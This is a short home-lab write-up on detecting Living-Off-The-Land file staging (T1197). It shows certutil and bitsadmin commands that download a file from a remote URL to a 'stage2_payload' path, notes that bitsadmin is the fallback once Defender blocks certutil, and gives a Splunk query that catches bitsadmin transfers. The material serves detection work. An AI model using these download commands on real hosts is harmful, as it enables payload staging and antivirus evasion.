# Scenario 3 - LOLBAS Download Attempt & Antivirus Interaction (T1197)

I initially attempted to simulate Living-Off-The-Land file staging using Microsoft's native certificate utility:
```powershell
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/.../sysmonconfig-export.xml" C:\Tools\stage2_payload.xml
```
* **Real-world observation:** Windows Defender immediately caught this and blocked the process due to built-in heuristic rules flagging `certutil` with `-urlcache`.
* **The Pivot:** To see how an attacker adapts when their first tool is blocked, I tested an alternative native binary: `bitsadmin.exe`.
```powershell
bitsadmin.exe /transfer myJob /download /priority foreground "https://raw.githubusercontent.com/.../sysmonconfig-export.xml" C:\Tools\stage2_payload.xml
```
### The Detection Query:

```spl
index="endpoint" EventCode=1 (Image="*\\bitsadmin.exe" OR OriginalFileName="bitsadmin.exe") CommandLine="*/transfer*"
| table _time, Computer, User, ParentImage, Image, CommandLine
```
* **Why check `OriginalFileName`:** If a threat actor renames `bitsadmin.exe` to something like `svchost.exe` to bypass simple name filters, Sysmon still pulls the internal PE header `OriginalFileName`, ensuring the detection still catches the transfer.
### Dashboard
![[bitsadmin_execution.png]]
